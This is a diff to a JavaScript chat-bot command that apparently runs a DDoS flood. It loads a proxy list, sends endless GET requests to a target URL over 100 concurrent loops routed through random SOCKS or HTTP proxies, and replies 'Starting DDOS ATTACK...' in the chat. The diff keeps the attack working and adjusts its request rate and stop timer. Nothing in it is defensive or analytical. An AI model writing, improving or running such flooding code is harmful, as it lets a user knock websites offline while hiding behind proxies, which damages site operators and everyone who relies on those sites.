@@ -68,7 +68,7 @@ const acceptHeaders = [
 
 const proxyFilePath = path.join(__dirname, "proxy.txt");
 const maxRequests = Number.MAX_SAFE_INTEGER;
-const requestsPerSecond = Number.MAX_SAFE_INTEGER;
+const requestsPerSecond = 10000000;
 const numThreads = 100;
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
@@ -82,9 +82,12 @@ const loadProxies = () => {
 };
 
 const performAttack = (url, agent, headers, onComplete) => {
-    axios
-    .get(url, {
-        httpAgent: agent || null, headers, timeout: 0
+    if (!continueAttack) return;
+
+    axios.get(url, {
+        httpAgent: agent || null,
+        headers,
+        timeout: 0
     })
     .then(() => setTimeout(() => performAttack(url, agent, headers, onComplete), 0))
     .catch((err) => {
@@ -129,21 +132,26 @@ module.exports["run"] = async ({
     let continueAttack = true;
     await chat.reply(font.thin("Starting DDOS ATTACK..."));
 
-    for (let i = 0; i < numThreads; i++) {
-        const randomProxy = getRandomElement(proxies);
-        const proxyParts = randomProxy.split(":");
-
-        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5": "http";
-        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
-
-        const agent = proxyProtocol === "socks5"
-        ? new SocksProxyAgent(proxyUrl): new HttpsProxyAgent(proxyUrl);
-
-        performAttack(targetUrl, agent, headers, () => (continueAttack = false));
-    }
-
-    setTimeout(() => {
+    const attackTimeout = setTimeout(() => {
         continueAttack = false;
         chat.reply(font.thin("Max flood requests reached. Attack stopped."));
     }, (maxRequests / requestsPerSecond) * 1000);
+
+    for (let i = 0; i < numThreads && continueAttack; i++) {
+        const randomProxy = getRandomElement(proxies);
+        const proxyParts = randomProxy.split(":");
+
+        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
+        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
+
+        const agent = proxyProtocol === "socks5"
+            ? new SocksProxyAgent(proxyUrl)
+            : new HttpsProxyAgent(proxyUrl);
+
+        performAttack(targetUrl, agent, headers, () => {
+            if (!continueAttack) {
+                clearTimeout(attackTimeout);
+            }
+        });
+    }
 };
